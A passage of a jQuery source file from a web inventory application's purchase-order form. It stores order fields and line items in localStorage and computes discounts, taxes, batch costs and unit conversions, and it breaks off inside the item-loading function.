$(document).ready(function () {
    $('body a, body button').attr('tabindex', -1);
    check_add_item_val();
    if (site.settings.set_focus != 1) {
        $('#add_item').focus();
    }
// Order level shipping and discoutn localStorage
    if (podiscount = localStorage.getItem('podiscount')) {
        $('#podiscount').val(podiscount);
    }
    $('#potax2').change(function (e) {
        localStorage.setItem('potax2', $(this).val());
    });
    if (potax2 = localStorage.getItem('potax2')) {
        $('#potax2').select2("val", potax2);
    }
    $('#postatus').change(function (e) {
        localStorage.setItem('postatus', $(this).val());
    });
    if (postatus = localStorage.getItem('postatus')) {
        $('#postatus').select2("val", postatus);
    }
    var old_shipping;
    $('#poshipping').focus(function () {
        old_shipping = $(this).val();
    }).change(function () {
        if ($(this).val() != '') {
            if (!is_numeric($(this).val())) {
                $(this).val(old_shipping);
                bootbox.alert(lang.unexpected_value);
                return;
            } else {
                shipping = $(this).val() ? parseFloat($(this).val()) : '0';
            }
        } else {
            shipping = 0;
            localStorage.removeItem('toshipping');
        }

        localStorage.setItem('poshipping', shipping);
        var gtotal = ((total + invoice_tax) - order_discount) + shipping;
        $('#gtotal').text(formatMoney(gtotal));
        $('#tship').text(formatMoney(shipping));
    });
    if (poshipping = localStorage.getItem('poshipping')) {
        shipping = parseFloat(poshipping);
        $('#poshipping').val(shipping);
        $('#tship').text(formatMoney(shipping));
    }

    $('#popayment_term').change(function (e) {
        localStorage.setItem('popayment_term', $(this).val());
    });
    if (popayment_term = localStorage.getItem('popayment_term')) {
        $('#popayment_term').val(popayment_term);
    }

// If there is any item in localStorage
    if (localStorage.getItem('poitems')) {
        loadItems();
    }

    // clear localStorage and reload
    $('#reset').click(function (e) {
        bootbox.confirm(lang.r_u_sure, function (result) {
            if (result) {
                if (localStorage.getItem('poitems')) {
                    localStorage.removeItem('poitems');
                }
                if (localStorage.getItem('podiscount')) {
                    localStorage.removeItem('podiscount');
                }
                if (localStorage.getItem('potax2')) {
                    localStorage.removeItem('potax2');
                }
                if (localStorage.getItem('poshipping')) {
                    localStorage.removeItem('poshipping');
                }
                if (localStorage.getItem('poref')) {
                    localStorage.removeItem('poref');
                }
                if (localStorage.getItem('powarehouse')) {
                    localStorage.removeItem('powarehouse');
                }
                if (localStorage.getItem('ponote')) {
                    localStorage.removeItem('ponote');
                }
                if (localStorage.getItem('posupplier')) {
                    localStorage.removeItem('posupplier');
                }
                if (localStorage.getItem('pocurrency')) {
                    localStorage.removeItem('pocurrency');
                }
                if (localStorage.getItem('poextras')) {
                    localStorage.removeItem('poextras');
                }
                if (localStorage.getItem('podate')) {
                    localStorage.removeItem('podate');
                }
                if (localStorage.getItem('postatus')) {
                    localStorage.removeItem('postatus');
                }
                if (localStorage.getItem('popayment_term')) {
                    localStorage.removeItem('popayment_term');
                }

                $('#modal-loading').show();
                location.reload();
            }
        });
    });

// save and load the fields in and/or from localStorage
    var $supplier = $('#posupplier'), $currency = $('#pocurrency');

    $('#poref').change(function (e) {
        localStorage.setItem('poref', $(this).val());
    });
    if (poref = localStorage.getItem('poref')) {
        $('#poref').val(poref);
    }
    $('#powarehouse').change(function (e) {
        localStorage.setItem('powarehouse', $(this).val());
    });
    if (powarehouse = localStorage.getItem('powarehouse')) {
        $('#powarehouse').select2("val", powarehouse);
    }

    $('#ponote').redactor('destroy');
    $('#ponote').redactor({
        buttons: ['formatting', '|', 'alignleft', 'aligncenter', 'alignright', 'justify', '|', 'bold', 'italic', 'underline', '|', 'unorderedlist', 'orderedlist', '|', 'link', '|', 'html'],
        formattingTags: ['p', 'pre', 'h3', 'h4'],
        minHeight: 100,
        changeCallback: function (e) {
            var v = this.get();
            localStorage.setItem('ponote', v);
        }
    });
    if (ponote = localStorage.getItem('ponote')) {
        $('#ponote').redactor('set', ponote);
    }
    $supplier.change(function (e) {
        localStorage.setItem('posupplier', $(this).val());
        $('#supplier_id').val($(this).val());
    });
    if (posupplier = localStorage.getItem('posupplier')) {
        $supplier.val(posupplier).select2({
            minimumInputLength: 1,
            data: [],
            initSelection: function (element, callback) {
                $.ajax({
                    type: "get", async: false,
                    url: site.base_url + "suppliers/getSupplierName/" + $(element).val(),
                    dataType: "json",
                    success: function (data) {
                        callback(data[0]);
                    }
                });
            },
            ajax: {
                url: site.base_url + "suppliers/suggestions",
                dataType: 'json',
                quietMillis: 15,
                data: function (term, page) {
                    return {
                        term: term,
                        limit: 10
                    };
                },
                results: function (data, page) {
                    if (data.results != null) {
                        return {results: data.results};
                    } else {
                        return {results: [{id: '', text: 'No Match Found'}]};
                    }
                }
            }
        });

    } else {
        nsSupplier();
    }

    /*$('.rexpiry').change(function (e) {
     var item_id = $(this).closest('tr').attr('data-item-id');
     poitems[item_id].row.expiry = $(this).val();
     localStorage.setItem('poitems', JSON.stringify(poitems));
     });*/
    if (localStorage.getItem('poextras')) {
        $('#extras').iCheck('check');
        $('#extras-con').show();
    }
    $('#extras').on('ifChecked', function () {
        localStorage.setItem('poextras', 1);
        $('#extras-con').slideDown();
    });
    $('#extras').on('ifUnchecked', function () {
        localStorage.removeItem("poextras");
        $('#extras-con').slideUp();
    });
    $(document).on('change', '.rexpiry', function () {
        var item_id = $(this).closest('tr').attr('data-item-id');
        poitems[item_id].row.expiry = $(this).val();
        localStorage.setItem('poitems', JSON.stringify(poitems));
    });
    $(document).on('change', '.rbtach_no', function () {
        /* var item_id = $(this).closest('tr').attr('data-item-id');
         poitems[item_id].row.batch_number = $(this).val();
         localStorage.setItem('poitems', JSON.stringify(poitems));*/

        var item_id = $(this).closest('tr').attr('data-item-id');
        var batch = $(this).val();
        var batch_id = $(this).find(':selected').attr('data-batchid');

        batch_id = batch_id ? batch_id : (poitems[item_id].batchsData[batch] ? poitems[item_id].batchsData[batch] : false);

        poitems[item_id].row.batch_number = batch;

        if (batch_id) {
            poitems[item_id].row.batch = batch_id;

            var batchvalue = poitems[item_id].batchs[batch_id];

            poitems[item_id].row.cost = batchvalue['cost'];
            poitems[item_id].row.real_unit_cost = batchvalue['cost'];
            poitems[item_id].row.base_unit_cost = batchvalue['cost'];
            poitems[item_id].row.expiry = batchvalue['expiry'] !== '' ? batchvalue['expiry'] : '';
        }

        localStorage.setItem('poitems', JSON.stringify(poitems));
        loadItems();
    });

    $(document).on('change', '#pbatch_number', function () {
        if (parseInt(site.settings.product_batch_setting) > 0) {
            onBatchChanged();
        }
    });

    $(document).on('change', '#poption', function () {
       
        onVariantChanged();
         
    });

// prevent default action upon enter
    $('body').bind('keypress', function (e) {
        if ($(e.target).hasClass('redactor_editor')) {
            return true;
        }
        if (e.keyCode == 13) {
            e.preventDefault();
            return false;
        }
    });

// Order tax calcuation
    if (site.settings.tax2 != 0) {
        $('#potax2').change(function () {
            localStorage.setItem('potax2', $(this).val());
            loadItems();
            return;
        });
    }

// Order discount calcuation
    var old_podiscount;
    $('#podiscount').focus(function () {
        old_podiscount = $(this).val();
    }).change(function () {
        if (is_valid_discount($(this).val())) {
            localStorage.removeItem('podiscount');
            localStorage.setItem('podiscount', $(this).val());
            loadItems();
            return;
        } else {
            localStorage.removeItem('podiscount');
            loadItems();
            //$(this).val(old_podiscount);
            // bootbox.alert(lang.unexpected_value);
            return;
        }

    });


    /* ----------------------
     * Delete Row Method
     * ---------------------- */

    $(document).on('click', '.podel', function () {

        var row = $(this).closest('tr');
        var item_id = row.attr('data-item-id');
        delete poitems[item_id];
        row.remove();
        if (poitems.hasOwnProperty(item_id)) {
        } else {
            localStorage.setItem('poitems', JSON.stringify(poitems));
            loadItems();
            return;
        }
    });

    /* -----------------------
     * Edit Row Modal Hanlder
     ----------------------- */
    $(document).on('click', '.edit', function () {
        var row = $(this).closest('tr');
        var row_id = row.attr('id');
        item_id = row.attr('data-item-id');
        item = poitems[item_id];

        if (parseInt(site.settings.product_batch_setting) > 0) {
            var batch_number = row.children().children('.rbtach_no').val();
        }
        var qty = row.children().children('.rquantity').val(),
                product_option = row.children().children('.roption').val(),
                unit_cost = formatDecimal(row.children().children('.rucost').val()),
                discount = row.children().children('.rdiscount').val();

        $('#prModalLabel').text(item.row.name + ' (' + item.row.code + ')');
        var real_unit_cost = item.row.real_unit_cost;
        var net_cost = real_unit_cost;
        var tax_method = item.row.tax_method;
        if (site.settings.tax1) {
            // $('#ptax').select2('val', item.row.tax_rate);
            $('#old_tax').val(item.row.tax_rate);
            var item_discount = 0, ds = discount ? discount : '0';
            if (ds.indexOf("%") !== -1) {
                var pds = ds.split("%");
                if (!isNaN(pds[0])) {
                    item_discount = parseFloat(((real_unit_cost) * parseFloat(pds[0])) / 100);
                } else {
                    item_discount = parseFloat(ds);
                }
            } else {
                item_discount = parseFloat(ds);
            }
            net_cost -= item_discount;
            var pr_tax = item.row.tax_rate, pr_tax_val = 0;
            if (pr_tax !== null && pr_tax != 0) {
                $.each(tax_rates, function () {
                    if (this.id == pr_tax) {
                        if (this.type == 1) {

                            if (poitems[item_id].row.tax_method == 0) {
                                pr_tax_val = formatDecimal((((real_unit_cost - item_discount) * parseFloat(this.rate)) / (100 + parseFloat(this.rate))), 4);
                                pr_tax_rate = formatDecimal(this.rate) + '%';
                                net_cost -= pr_tax_val;
                            } else {
                                pr_tax_val = formatDecimal((((real_unit_cost - item_discount) * parseFloat(this.rate)) / 100), 4);
                                pr_tax_rate = formatDecimal(this.rate) + '%';
                            }

                        } else if (this.type == 2) {

                            pr_tax_val = parseFloat(this.rate);
                            pr_tax_rate = this.rate;

                        }
                    }
                });
            }
        }
        if (site.settings.product_serial !== 0) {
            $('#pserial').val(row.children().children('.rserial').val());
        }

        if (parseInt(site.settings.product_batch_setting) > 0) {
            var edtbatch = '<p style="margin: 12px 0 0 0;"><input class="form-control" name="pbatch_number" type="text" id="pbatch_number"></p>';
            if (parseInt(site.settings.product_batch_setting) == 1) {
                if (item.batchs) {
                    var b = 1;
                    edtbatch = $('<select id="pbatch_number" name="pbatch_number" class="form-control" />');
                    $.each(item.batchs, function () {
                        $('<option data-batchid="' + this.id + '" data-cost="' + this.cost + '" value="' + this.batch_no + '" >' + this.batch_no + '</option>').appendTo(edtbatch);
                        b++;
                    });
                }
            } else if (parseInt(site.settings.product_batch_setting) == 2) {
                if (item.batchs) {
                    edtbatch = '<input list="batches" class="form-control" name="pbatch_number" id="pbatch_number"><datalist id="batches">';
                    $.each(item.batchs, function () {
                        edtbatch += '<option data-batchid="' + this.id + '" data-cost="' + this.cost + '" value="' + this.batch_no + '" >' + this.batch_no + '</option>';
                        batchno = this.batch_no;
                        batchid = this.id;
                        batchIds[batchno] = batchid;
                    });
                    edtbatch += '</datalist>';
                    poitems[item_id].batchsData = batchIds;
                }
            }
         
            $('#batchNo_div').html(edtbatch);
            $('#pbatch_number').select2('val', item.row.batch_number);
        }


        var opt = '<p style="margin: 12px 0 0 0;">n/a</p>';
        if (item.row.storage_type == 'packed') {
            if (item.options !== false) {
                var o = 1;
                opt = $('<select id="poption" name="poption" class="form-control select" />');
                $.each(item.options, function () {
                    if (o == 1) {
//                        if (product_option == '') {
//                            product_variant = this.id;
//                        } else {
//                            product_variant = product_option;
//                        }
                    }
                    $("<option />", {value: this.id, text: this.name}).appendTo(opt);
                    o++;
                });
            }
        }

        uopt = $("<select id=\"punit\" name=\"punit\" class=\"form-control select\" />");
        $.each(item.units, function () {
            if (this.id == item.row.unit) {
                $("<option />", {value: this.id, text: this.name, selected: true}).appendTo(uopt);
            } else {
                $("<option />", {value: this.id, text: this.name}).appendTo(uopt);
            }
        });


        $('#prModal').appendTo("body").modal('show');

        $('#poptions-div').html(opt);
        $('#punits-div').html(uopt);
        $('select.select').select2({minimumResultsForSearch: 7});
        $('#pquantity').val(qty);
        $('#old_qty').val(qty);
        $('#pcost').val(unit_cost);
        $('#punit_cost').val(formatDecimal(parseFloat(unit_cost) + parseFloat(pr_tax_val)));
        $('#poption').select2('val', item.row.option);
        $('#old_cost').val(unit_cost);
        $('#row_id').val(row_id);
        $('#item_id').val(item_id);
        $('#pexpiry').val(row.children().children('.rexpiry').val());
        $('#pbatch_number').val(batch_number);
        $('#pdiscount').val(discount);
        $('#net_cost').text(formatMoney(net_cost));
        $('#pro_tax').text(formatMoney(pr_tax_val));
        $('#tax_method').val(tax_method).trigger('change');
        $('#ptax').val(pr_tax).trigger('change');
        $('#storage_type').val(item.row.storage_type);
        //   $('#ptax').val(pr_tax_rate);
        $('#psubtotal').val('');

    });

    $('#prModal').on('shown.bs.modal', function (e) {
        if ($('#poption').select2('val') != '') {
            $('#poption').select2('val', product_variant);
            product_variant = 0;
        }
    });

    $(document).on('change', '#pcost, #ptax, #tax_method, #pdiscount', function () {

        var pr_tax = $('#ptax').val();

        var row = $('#' + $('#row_id').val());
        var item_id = row.attr('data-item-id');
        var unit_cost = parseFloat($('#pcost').val());
        var item = poitems[item_id];
        var ds = $('#pdiscount').val() ? $('#pdiscount').val() : '0';
        if (ds.indexOf("%") !== -1) {
            var pds = ds.split("%");
            if (!isNaN(pds[0])) {
                item_discount = parseFloat(((unit_cost) * parseFloat(pds[0])) / 100);
            } else {
                item_discount = parseFloat(ds);
            }
        } else {
            item_discount = parseFloat(ds);
        }
        unit_cost -= item_discount;
        var tax_method = $('#tax_method').val();
        var /*pr_tax = $('#ptax').val(),*/ item_tax_method = tax_method;  //item.row.tax_method;
        var pr_tax_val = 0, pr_tax_rate = 0;
        if (pr_tax !== null && pr_tax != 0) {
            $.each(tax_rates, function () {
                if (this.id == pr_tax) {
                    if (this.type == 1) {

                        if (item_tax_method == 0) {
                            pr_tax_val = formatDecimal((((unit_cost) * parseFloat(this.rate)) / (100 + parseFloat(this.rate))), 4);
                            pr_tax_rate = formatDecimal(this.rate) + '%';
                            unit_cost -= pr_tax_val;
                        } else {
                            pr_tax_val = formatDecimal((((unit_cost) * parseFloat(this.rate)) / 100), 4);
                            pr_tax_rate = formatDecimal(this.rate) + '%';
                        }

                    } else if (this.type == 2) {

                        pr_tax_val = parseFloat(this.rate);
                        pr_tax_rate = this.rate;

                    }
                }
            });
        }

        $('#net_cost').text(formatMoney(unit_cost));
        $('#pro_tax').text(formatMoney(pr_tax_val));
    });

    $(document).on('change', '#punit', function () {
        var row = $('#' + $('#row_id').val());
        var item_id = row.attr('data-item-id');
        var item = poitems[item_id];
        if (!is_numeric($('#pquantity').val()) || parseFloat($('#pquantity').val()) < 0) {
            $(this).val(old_row_qty);
            bootbox.alert(lang.unexpected_value);
            return;
        }
        var unit = $('#punit').val();
        if (unit != poitems[item_id].row.base_unit) {
            $.each(item.units, function () {
                if (this.id == unit) {
                    $('#pcost').val(formatDecimal((parseFloat(item.row.base_unit_cost) * (unitToBaseQty(1, this))), 4)).change();
                }
            });
        } else {
            $('#pcost').val(formatDecimal(item.row.base_unit_cost)).change();
        }
    });

    $(document).on('click', '#calculate_unit_price', function () {
        var row = $('#' + $('#row_id').val());
        var item_id = row.attr('data-item-id');
        var item = poitems[item_id];
        if (!is_numeric($('#pquantity').val()) || parseFloat($('#pquantity').val()) < 0) {
            $(this).val(old_row_qty);
            bootbox.alert(lang.unexpected_value);
            return;
        }
        var subtotal = parseFloat($('#psubtotal').val()),
                qty = parseFloat($('#pquantity').val());
        $('#pcost').val(formatDecimal((subtotal / qty), 4)).change();
        return false;
    });

    /* -----------------------
     * Edit Row Method
     ----------------------- */
    $(document).on('click', '#editItem', function () {

        var row = $('#' + $('#row_id').val());
        var item_id = row.attr('data-item-id'), new_pr_tax = $('#ptax').val(), new_pr_tax_rate = {};
        var tax_method = $('#tax_method').val();
        if (new_pr_tax) {
            $.each(tax_rates, function () {
                if (this.id == new_pr_tax) {
                    new_pr_tax_rate = this;
                }
            });
        }

        if (!is_numeric($('#pquantity').val()) || parseFloat($('#pquantity').val()) < 0) {
            $(this).val(old_row_qty);
            bootbox.alert(lang.unexpected_value);
            return;
        }

        var unit = $('#punit').val();
        var base_quantity = parseFloat($('#pquantity').val());
        if (unit != poitems[item_id].row.base_unit) {
            $.each(poitems[item_id].units, function () {
                if (this.id == unit) {
                    base_quantity = unitToBaseQty($('#pquantity').val(), this);
                }
            });
        }

        if (parseInt(site.settings.product_batch_setting) > 0) {
            var batch = $('#pbatch_number').val();
            var batch_id = $('#pbatch_number').find(':selected').attr('data-batchid');
            var cost = $('#pbatch_number').find(':selected').attr('data-cost');

            poitems[item_id].row.batch_number = batch;
            poitems[item_id].row.batch = batch_id;
            poitems[item_id].row.cost = cost;
        }

        poitems[item_id].row.fup = 1,
        poitems[item_id].row.qty = parseFloat($('#pquantity').val()),
        poitems[item_id].row.base_quantity = parseFloat(base_quantity),
        poitems[item_id].row.unit = unit,
        poitems[item_id].row.unit_lable = document.getElementById('punit').selectedOptions[0].text,
        poitems[item_id].row.real_unit_cost = parseFloat($('#pcost').val()),
        poitems[item_id].row.tax_rate = new_pr_tax,
        poitems[item_id].tax_rate = new_pr_tax_rate,
        poitems[item_id].row.discount = $('#pdiscount').val() ? $('#pdiscount').val() : '0',
        poitems[item_id].row.option = $('#poption').val(),
        poitems[item_id].row.expiry = $('#pexpiry').val() ? $('#pexpiry').val() : '';

        poitems[item_id].row.tax_method = tax_method;
        localStorage.setItem('poitems', JSON.stringify(poitems));
        $('#prModal').modal('hide');
        loadItems();
        return;
    });

    /* ------------------------------
     * Show manual item addition modal
     ------------------------------- */
    $(document).on('click', '#addManually', function (e) {
        $('#mModal').appendTo("body").modal('show');
        return false;
    });

    /* --------------------------
     * Edit Row Quantity Method
     -------------------------- */
    var old_row_qty;
    $(document).on("focus", '.rquantity', function () {
        old_row_qty = $(this).val();
    }).on("change", '.rquantity', function () {

        var row = $(this).closest('tr');
        if (!is_numeric($(this).val()) || parseFloat($(this).val()) < 0) {
            $(this).val(old_row_qty);
            bootbox.alert(lang.unexpected_value);
            return;
        }

        var new_qty = parseFloat($(this).val()),
                item_id = row.attr('data-item-id');
        poitems[item_id].row.base_quantity = new_qty;
        if (poitems[item_id].row.unit != poitems[item_id].row.base_unit) {
            $.each(poitems[item_id].units, function () {
                if (this.id == poitems[item_id].row.unit) {
                    poitems[item_id].row.base_quantity = unitToBaseQty(new_qty, this);
                }
            });
        }
        poitems[item_id].row.qty = new_qty;
        poitems[item_id].row.received = new_qty;

        localStorage.setItem('poitems', JSON.stringify(poitems));

        loadItems();
    });

    var old_received;
    $(document).on("focus", '.received', function () {
        old_received = $(this).val();
    }).on("change", '.received', function () {
        var row = $(this).closest('tr');
        new_received = $(this).val() ? $(this).val() : 0;
        if (!is_numeric(new_received)) {
            $(this).val(old_received);
            bootbox.alert(lang.unexpected_value);
            return;
        }
        var new_received = parseFloat($(this).val()),
                item_id = row.attr('data-item-id');
        if (new_received > poitems[item_id].row.qty) {
            $(this).val(old_received);
            bootbox.alert(lang.unexpected_value);
            return;
        }

//        unit = formatDecimal(row.children().children('.runit').val()),
//        $.each(poitems[item_id].units, function(){
//            
//            if (this.id == unit) {
//                 
//                qty_received = formatDecimal(unitToBaseQty(new_received, this), 4);
//            }
//        });


        poitems[item_id].row.unit_received = new_received;
        poitems[item_id].row.received = new_received;
//        poitems[item_id].row.received = qty_received;
        localStorage.setItem('poitems', JSON.stringify(poitems));
        loadItems();
    });

    /* --------------------------
     * Edit Row Cost Method
     -------------------------- */
    var old_cost;
    $(document).on("focus", '.rcost', function () {
        old_cost = $(this).val();
    }).on("change", '.rcost', function () {
        var row = $(this).closest('tr');
        if (!is_numeric($(this).val())) {
            $(this).val(old_cost);
            bootbox.alert(lang.unexpected_value);
            return;
        }
        var new_cost = parseFloat($(this).val()),
                item_id = row.attr('data-item-id');
        poitems[item_id].row.cost = new_cost;
        localStorage.setItem('poitems', JSON.stringify(poitems));
        loadItems();
    });

    $(document).on("click", '#removeReadonly', function () {
        $('#posupplier').select2('readonly', false);
        return false;
    });

    if (po_edit) {
        $('#posupplier').select2("readonly", true);
    }

    $('.pcalculate').on('change', function(){
        
        calculateCost();
        
    });

});
/* -----------------------
 * Misc Actions
 ----------------------- */


function onVariantChanged() {
    var item_id = $('#item_id').val();
    var poption = $('#poption').val();
        
    var selected = '';    
       
    var itemOptions = poitems[item_id].options
    
    if (parseInt(site.settings.product_batch_setting) > 0) {
                
        var batch_id = poitems[item_id].row.batch;
        var batch_number = poitems[item_id].row.batch_number;
        
        var b = 0;
        var first_batch_number = '';
        var batchIds = [];
        var btc = '<input type="text" class="form-control" name="pbatch_number" id="pbatch_number" value="' + batch_number + '">';
    
        if (poitems[item_id].option_batches !== false && poitems[item_id].option_batches[poption]) {
            var optionBatched = poitems[item_id].option_batches[poption];
        
            if (parseInt(site.settings.product_batch_setting) == 1) {
            btc = '<select id="pbatch_number" name="pbatch_number" class="form-control" >';

            $.each(optionBatched, function () {
                b++;
                batch_number = (batch_id == this.id) ? this.batch_no : '';
                btc += '<option data-batchid="' + this.id + '" value="' + this.batch_no + '" ' + selected + ' >' + this.batch_no + '</option>';
                if (b == 1) {
                    first_batch_number = this.batch_no;
                }
            });
            btc += '</select>';

            } else if (parseInt(site.settings.product_batch_setting) == 2) {

                btc = '<input list="batches" class="form-control" name="pbatch_number" id="pbatch_number" value="' + batch_number + '"><datalist id="batches">';
                $.each(optionBatched, function () {
                    b++;
                    batch_number = batch_number ? batch_number : ((batch_id == this.id) ? this.batch_no : '');
                    btc += '<option data-batchid="' + this.id + '" value="' + this.batch_no + '" >';
                    if (b == 1) {
                        first_batch_number = this.batch_no;
                    }
                    batchno = this.batch_no;
                    batchid = this.id;
                    batchIds[batchno] = batchid;

                });
                btc += '</datalist>';
                poitems[item_id].batchsData = batchIds;
            }
        }
    
        $('#batchNo_div').html(btc);
        $('#pbatch_number').select2('val', batch_number ? batch_number : first_batch_number);

        poitems[item_id].batchs = optionBatched ? optionBatched : false;
                 
    } else {
        
        $.each(itemOptions, function () {
            if (poption == this.id) {
                var opt_cost = this.cost;
                $('#pcost').val(opt_cost);
            } 
        });
        
    }
    
    calculateCost();
    
    localStorage.setItem('poitems', JSON.stringify(poitems));
}

function calculateCost(){
    
    var item_id         = $('#item_id').val();
    var real_unit_cost  = $('#pcost').val();
    var ptax            = $('#ptax').val();     
    var pquantity = parseFloat($('#pquantity').val()) ? $('#pquantity').val() : 1;  
   
    var net_cost = real_unit_cost;       
    var item_discount = 0; 
    var ds = $('#pdiscount').val();
    if (ds.indexOf("%") !== -1) {
        var pds = ds.split("%");
        if (!isNaN(pds[0])) {
            item_discount = parseFloat(((real_unit_cost) * parseFloat(pds[0])) / 100);
        } else {
            item_discount = parseFloat(ds);
        }
    } else {
        item_discount = parseFloat(ds);
    }
     
    var unit_cost = parseFloat(real_unit_cost) - parseFloat(item_discount);
         
    var pr_tax_val = 0, pr_tax_rate = 0, unit_tax = 0;
    if (site.settings.tax1 == 1) {
        
        var tax_rate   = poitems[item_id].tax_rate;
        var tax_method = $('#tax_method').val(); // 0:Inclusive | 1:Exclusive
    
        $.each(tax_rates, function () {
            if (this.id == ptax) {
                pr_tax_rate = this.rate;
                pr_tax_type = this.type;                 
            }
        });
        
        if (pr_tax_rate) {
            if (pr_tax_type == 1) {
                if (tax_method == '0') {
                    pr_tax_val = formatDecimal(((unit_cost) * parseFloat(pr_tax_rate)) / (100 + parseFloat(pr_tax_rate)), 4);
                    pr_tax_rate = formatDecimal(pr_tax_rate) + '%';
                } else {
                    pr_tax_val = formatDecimal(((unit_cost) * parseFloat(pr_tax_rate)) / 100, 4);
                    pr_tax_rate = formatDecimal(pr_tax_rate) + '%';
                }

            } else if (pr_tax_type == 2) {

                pr_tax_val = parseFloat(pr_tax_rate);
                pr_tax_rate = pr_tax_rate;
            }            
        }
    }
    
    var item_tax = pr_tax_val * pquantity;
    
    net_cost = tax_method == 0 ? formatDecimal(unit_cost - item_tax, 4) : formatDecimal(unit_cost);     
    
    $('#net_cost').html(formatMoney(net_cost));
    $('#pro_tax').html(formatMoney(item_tax));
    
    var subtotal =  parseFloat(pquantity) * parseFloat(net_cost);
    $('#psubtotal').val(formatMoney(subtotal));
}
 
function onBatchChanged() {

    var item_id     = $('#item_id').val();
    var batch       = $('#pbatch_number').val();
    var batch_id    = $('#pbatch_number').find(':selected').attr('data-batchid'); 

    batch_id = batch_id ? batch_id : (poitems[item_id].batchsData[batch] ? poitems[item_id].batchsData[batch] : false)

    if (batch_id && poitems[item_id].batchs[batch_id]) {

        var batchvalue = poitems[item_id].batchs[batch_id];

        var batch_cost = batchvalue['cost'];
        var pexpiry = batchvalue['expiry'] !== '' ? batchvalue['expiry'] : '';
        $('#pcost').val(batch_cost);
        $('#pexpiry').val(pexpiry);
        
        calculateCost();        
    }
}
 
function getVariant_Detail(VarientId, ItemId) {

    poitems[ItemId].row.option = VarientId;

    if (poitems[ItemId].option_batches[VarientId] && poitems[ItemId].row.storage_type == 'packed') {
        poitems[ItemId].batchs = poitems[ItemId].option_batches[VarientId];
    }

    localStorage.setItem('poitems', JSON.stringify(poitems));

    loadItems();
}

// hellper function for supplier if no localStorage value
function nsSupplier() {
    $('#posupplier').select2({
        minimumInputLength: 1,
        ajax: {
            url: site.base_url + "suppliers/suggestions",
            dataType: 'json',
            quietMillis: 15,
            data: function (term, page) {
                return {
                    term: term,
                    limit: 10
                };
            },
            results: function (data, page) {
                if (data.results != null) {
                    return {results: data.results};
                } else {
                    return {results: [{id: '', text: 'No Match Found'}]};
                }
            }
        }
    });
}

function loadItems() {

    if (localStorage.getItem('poitems')) {
        total = 0;
        count = 1;
        an = 1;
        product_tax = 0;
        invoice_tax = 0;
        product_discount = 0;
        order_discount = 0;
        total_discount = 0;
        total_netcost = 0;
        total_received_qty = 0;
        
        $("#poTable tbody").empty();

//        console.log('------------site.settings----------------');
//        console.log(site.settings);
        purcahsestatus = ($('#postatus').val() == 'ordered' ? 'display:none' : 'display:block');

        poitems = JSON.parse(localStorage.getItem('poitems'));

        ItemsCount = Object.keys(poitems).length;
        sortedItems = (site.settings.item_addition == 1) ? _.sortBy(poitems, function (o) {
            return [parseInt(o.order)];
        }) : poitems;
        var cart_item_unit_count = 0;
        $.each(sortedItems, function () {
            cart_item_unit_count += parseFloat(this.row.qty);
        });
        var order_no = new Date().getTime();
        
        console.log('-----------sortedItems---------');
        console.log(sortedItems);
            
        $.each(sortedItems, function () {

            var item = this;
            var item_id = site.settings.item_addition == 1 ? item.item_id : item.id;
            item.order = item.order ? item.order : order_no++;

            var unit_lable = item.row.unit_lable;
            var product_id = item.row.id, item_type = item.row.type, combo_items = item.combo_items, item_cost = item.row.cost, item_oqty = item.row.oqty, item_qty = item.row.qty, item_bqty = item.row.quantity_balance, item_expiry = item.row.expiry, item_batch_number = item.row.batch_number, item_tax_method = item.row.tax_method, item_option = item.row.option, item_code = item.row.code, item_name = item.row.name.replace(/"/g, "&#034;").replace(/'/g, "&#039;");
            var qty_received = (item.row.received >= 0) ? item.row.received : item.row.qty;
            var item_supplier_part_no = item.row.supplier_part_no ? item.row.supplier_part_no : '';
            if (item.row.new_entry == 1) {
                item_bqty = item_qty;
                item_oqty = item_qty;
            }
            var unit_cost = item.row.real_unit_cost;
            var product_unit = item.row.unit, base_quantity = item.row.base_quantity;
            var supplier = localStorage.getItem('posupplier'), belong = false;
            var hsn_code = item.row.hsn_code;
            var item_ds = item.row.discount, item_discount = 0;
            
            /** New Login Order Discount ***/
            if(item_ds != '' && item_ds) {
                var ds = item_ds ? item_ds : '0';
                if (ds.indexOf("%") !== -1) {
                    var pds = ds.split("%");
                    if (!isNaN(pds[0])) {
                        item_discount = formatDecimal((parseFloat(((unit_cost) * parseFloat(pds[0])) / 100)), 6);
                    } else {
                        item_discount = formatDecimal(ds);
                    }
                } else {
                    item_discount = formatDecimal(ds);
                }
                product_discount += parseFloat(item_discount * item_qty);  
            }
            
            /** New Logic Order Discount **/
            if(site.settings.purchase_order_discount == 1) {

                var posdiscount = localStorage.getItem('podiscount');
                 //Order Common Discount Calculations     
                if (posdiscount != '' && posdiscount != null) {

                    var ods = posdiscount;
                    if (ods.indexOf("%") !== -1) {
                        var pds = ods.split("%");
                        if (!isNaN(pds[0])) {
                            item_discount = formatDecimal((parseFloat(((unit_cost) * parseFloat(pds[0])) / 100)), 6);
                            item_ds = ods;
                        } else {
                            item_discount = formatDecimal(parseFloat(ods), 6);
                            item_ds = item_discount;
                        }
                    } else {
                        //If Discount in amount then divided equal in each items unit equally.
                        item_discount = formatDecimal((parseFloat(ods) / cart_item_unit_count), 6);
                        item_ds = item_discount;
                    }
                   
                    product_discount += parseFloat(item_discount * item_qty); 
                    //Set Order Discount Value null.
                }
            }//end if site.settings.purchase_order_discount

            /*
            if (supplier == item.row.supplier1) {
                belong = true;
            } else
            if (supplier == item.row.supplier2) {
                belong = true;
            } else
            if (supplier == item.row.supplier3) {
                belong = true;
            } else
            if (supplier == item.row.supplier4) {
                belong = true;
            } else
            if (supplier == item.row.supplier5) {
                belong = true;
            }
            */
            var unit_qty_received = qty_received;
            if (item.row.fup != 1 && product_unit != item.row.base_unit) {
                $.each(item.units, function () {
                    if (this.id == product_unit) {
                        base_quantity = formatDecimal(unitToBaseQty(item.row.qty, this), 4);
                        unit_qty_received = item.row.unit_received ? item.row.unit_received : formatDecimal(baseToUnitQty(qty_received, this), 4);
                        unit_cost = formatDecimal((parseFloat(item.row.base_unit_cost) * (unitToBaseQty(1, this))), 4);
                    }
                });
            }

            
            unit_cost  = formatDecimal(unit_cost - item_discount);
            var pr_tax = item.tax_rate;
            var pr_tax_val = 0, pr_tax_rate = 0;
            if (site.settings.tax1 == 1) {
                if (pr_tax !== false) {
                    if (pr_tax.type == 1) {
                        if (item_tax_method == '0') {
                            pr_tax_val = formatDecimal(((unit_cost) * parseFloat(pr_tax.rate)) / (100 + parseFloat(pr_tax.rate)), 4);
                            pr_tax_rate = formatDecimal(pr_tax.rate) + '%';
                        } else {
